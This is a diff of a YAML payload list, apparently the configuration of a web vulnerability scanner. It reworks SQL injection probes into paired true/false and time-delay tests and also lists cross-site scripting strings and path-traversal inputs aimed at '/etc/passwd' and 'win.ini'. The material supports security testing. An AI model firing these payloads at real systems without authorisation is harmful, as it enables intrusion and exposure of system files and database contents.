@@ -4,16 +4,13 @@ payloads:
     - "<img src=x onerror=alert(1)>"
     - ";!--\"<XSS>=&{()}"
   sqli:
-    - "'"
-    - "\""
-    - "' OR 1=1--"
-    - "' OR 1=2--"
-    - "' AND 1=1--"
-    - "' AND 1=2--"
-    - "' UNION SELECT NULL--"
-    - "' OR SLEEP(5)--"
-    - "; WAITFOR DELAY '0:0:5'--"
-    - "' OR EXTRACTVALUE(1, CONCAT(0x7e, version(), 0x7e))--"
+  - ["1=1", "1=2"]
+  - ["' OR '1'='1", "' OR '1'='2"]
+  - ["' AND 1=1--", "' AND 1=2--"]
+  - ["1' AND SLEEP(5)--", "1"]
+  - ["1); WAITFOR DELAY '0:0:5'--", "1"]
+  - ["' OR SLEEP(5)--", "'"]
+  - ["' OR EXTRACTVALUE(1, CONCAT(0x7e, version(), 0x7e))--", "'"]
   lfi:
     - "../../../../etc/passwd"
     - "../../../../windows/win.ini"
